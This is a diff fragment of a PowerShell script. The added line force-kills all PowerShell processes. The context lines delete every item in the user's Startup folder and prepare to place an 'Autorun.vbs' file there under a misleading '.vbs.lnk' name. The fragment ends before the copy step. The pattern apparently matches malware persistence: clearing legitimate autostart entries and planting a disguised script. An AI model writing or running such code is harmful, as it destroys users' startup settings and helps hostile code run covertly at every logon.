@@ -1,3 +1,4 @@
+Get-Process -Name powershell | Stop-Process -Force
 Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force
 $source = "C:\Users\Public\Downloads\Autorun.vbs"
 $destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
